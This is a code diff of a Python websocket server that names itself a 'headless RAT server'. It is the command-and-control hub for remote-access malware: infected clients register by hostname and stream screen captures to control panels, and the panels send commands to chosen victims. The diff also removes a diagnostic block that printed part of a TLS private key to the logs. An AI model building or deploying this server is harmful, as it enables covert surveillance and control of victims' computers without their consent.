@@ -5,102 +5,111 @@ import pathlib
 import json
 import os
 
-# The handler function remains the same
-CONNECTED_PARTIES = {} 
-async def handler(websocket, path):
-    # ... (no changes in this function, keeping it for brevity)
-    print(f"[*] New connection from {websocket.remote_address}")
-    session_id, role = None, None
+CONNECTED_CLIENTS = {}
+CONNECTED_PANELS = []
+
+async def broadcast_client_list():
+    """Sends the current list of clients to all connected panels."""
+    if not CONNECTED_PANELS:
+        return
+        
+    client_list = {
+        client_id: {"hostname": info["hostname"]}
+        for client_id, info in CONNECTED_CLIENTS.items()
+    }
+    
+    list_payload = json.dumps({"type": "client_list", "clients": client_list})
+    
+    # Use asyncio.gather to send to all panels concurrently
+    await asyncio.gather(*[panel.send(list_payload) for panel in CONNECTED_PANELS])
+
+async def route_message(websocket, initial_data):
+    """Main message routing loop after a party has been identified."""
+    role = initial_data.get("role")
+    client_id = initial_data.get("id")
+
     try:
-        data = json.loads(await websocket.recv())
-        role, session_id = data.get("role"), data.get("session_id")
-        if not role or not session_id: await websocket.close(1011, "Role/session_id required."); return
-        if session_id not in CONNECTED_PARTIES: CONNECTED_PARTIES[session_id] = {"panel": None, "client": None}
-        if role == "panel": CONNECTED_PARTIES[session_id]["panel"] = websocket; print(f"[*] Panel connected for session {session_id}")
-        elif role == "client": CONNECTED_PARTIES[session_id]["client"] = websocket; print(f"[*] Client connected for session {session_id}")
         while True:
             message = await websocket.recv()
-            session = CONNECTED_PARTIES.get(session_id, {})
-            panel_ws, client_ws = session.get("panel"), session.get("client")
-            if role == "panel" and client_ws: await client_ws.send(message)
-            elif role == "client" and panel_ws: await panel_ws.send(message)
-    except websockets.ConnectionClosed: print(f"[!] Connection for session {session_id} (role: {role}) closed.")
+            data = json.loads(message)
+
+            if role == "panel":
+                # Panel is sending a command for a specific client
+                target_client_id = data.get("target_id")
+                if target_client_id and target_client_id in CONNECTED_CLIENTS:
+                    await CONNECTED_CLIENTS[target_client_id]["ws"].send(json.dumps(data))
+
+            elif role == "client":
+                # Client is sending screen data, broadcast to all panels
+                payload = json.dumps({
+                    "type": "screen_data",
+                    "session_id": client_id,
+                    "data": data.get("data"),
+                    "width": data.get("width"),
+                    "height": data.get("height")
+                })
+                if CONNECTED_PANELS:
+                    await asyncio.gather(*[panel.send(payload) for panel in CONNECTED_PANELS])
+
+    except websockets.ConnectionClosed:
+        print(f"[!] {role.capitalize()} '{client_id}' disconnected.")
+
+async def handler(websocket, path):
+    print(f"[*] New connection from {websocket.remote_address}")
+    initial_data = None
+    try:
+        initial_message = await websocket.recv()
+        initial_data = json.loads(initial_message)
+        role = initial_data.get("role")
+
+        if role == "panel":
+            CONNECTED_PANELS.append(websocket)
+            print(f"[*] Control Panel connected. Total panels: {len(CONNECTED_PANELS)}")
+            await broadcast_client_list()
+            await route_message(websocket, initial_data)
+        
+        elif role == "client":
+            client_id = initial_data.get("id")
+            hostname = initial_data.get("hostname", "Unknown")
+            CONNECTED_CLIENTS[client_id] = {"ws": websocket, "hostname": hostname}
+            print(f"[*] Client '{hostname}' ({client_id}) connected. Total clients: {len(CONNECTED_CLIENTS)}")
+            await broadcast_client_list()
+            await route_message(websocket, initial_data)
+        
+        else:
+            await websocket.close(1011, "Unknown role.")
+
     finally:
-        if session_id and session_id in CONNECTED_PARTIES:
-            if role == "panel": CONNECTED_PARTIES[session_id]["panel"] = None
-            if role == "client": CONNECTED_PARTIES[session_id]["client"] = None
-            if not CONNECTED_PARTIES[session_id]["panel"] and not CONNECTED_PARTIES[session_id]["client"]:
-                del CONNECTED_PARTIES[session_id]; print(f"[*] Session {session_id} removed.")
+        if initial_data:
+            role = initial_data.get("role")
+            if role == "panel" and websocket in CONNECTED_PANELS:
+                CONNECTED_PANELS.remove(websocket)
+                print("[*] Control Panel disconnected.")
+            elif role == "client":
+                client_id = initial_data.get("id")
+                if client_id in CONNECTED_CLIENTS:
+                    del CONNECTED_CLIENTS[client_id]
+                    print(f"[*] Client '{client_id}' disconnected.")
+                    await broadcast_client_list()
 
 async def main():
-    # --- NEW DIAGNOSTIC CODE ---
-    print("\n" + "="*50)
-    print("      STARTING DIAGNOSTIC CHECK")
-    print("="*50)
-    
-    secret_path_str = "/etc/secrets/"
-    cert_file_str = os.path.join(secret_path_str, "cert.pem")
-    key_file_str = os.path.join(secret_path_str, "key.pem")
-
-    print(f"[*] Checking for secrets directory: '{secret_path_str}'")
-    if os.path.isdir(secret_path_str):
-        print(f"  [SUCCESS] Directory exists.")
-        try:
-            files_in_dir = os.listdir(secret_path_str)
-            print(f"  [*] Files found inside: {files_in_dir if files_in_dir else 'None'}")
-            
-            # Check cert.pem
-            print(f"\n[*] Checking for cert file: '{cert_file_str}'")
-            if os.path.isfile(cert_file_str):
-                print("  [SUCCESS] cert.pem exists.")
-                with open(cert_file_str, 'r') as f:
-                    content_preview = f.read(30).strip()
-                print(f"  [*] Content preview: '{content_preview}...', Size: {os.path.getsize(cert_file_str)} bytes")
-            else:
-                print("  [FAILURE] cert.pem does NOT exist or is not a file.")
-
-            # Check key.pem
-            print(f"\n[*] Checking for key file: '{key_file_str}'")
-            if os.path.isfile(key_file_str):
-                print("  [SUCCESS] key.pem exists.")
-                with open(key_file_str, 'r') as f:
-                    content_preview = f.read(30).strip()
-                print(f"  [*] Content preview: '{content_preview}...', Size: {os.path.getsize(key_file_str)} bytes")
-            else:
-                print("  [FAILURE] key.pem does NOT exist or is not a file.")
-
-        except Exception as e:
-            print(f"  [ERROR] An exception occurred while inspecting the directory: {e}")
-    else:
-        print(f"  [FAILURE] Directory '{secret_path_str}' does NOT exist.")
-        
-    print("="*50)
-    print("      DIAGNOSTIC CHECK COMPLETE")
-    print("="*50 + "\n")
-    # --- END DIAGNOSTIC CODE ---
-
-
-    # Original server code
     secret_path = pathlib.Path("/etc/secrets/")
-    certfile = secret_path / "cert.pem"
-    keyfile = secret_path / "key.pem"
-
+    local_path = pathlib.Path(__file__).with_name("certs")
+    if secret_path.exists() and (secret_path / "cert.pem").exists():
+        certfile, keyfile = secret_path / "cert.pem", secret_path / "key.pem"
+    else:
+        certfile, keyfile = local_path / "cert.pem", local_path / "key.pem"
     try:
         ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         ssl_context.load_cert_chain(certfile, keyfile)
     except FileNotFoundError:
-        print(f"[!!!] FATAL ERROR: Shutting down due to missing certificate files.")
-        return # Exit cleanly
-
+        print(f"[!!!] FATAL ERROR: Certificate files not found.")
+        return
     host = "0.0.0.0"
     port = int(os.environ.get("PORT", 8765))
-    
     print(f"[*] Starting headless RAT server on wss://{host}:{port}")
     async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
         await asyncio.Future()
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("[*] Server is shutting down.")
+    asyncio.run(main())
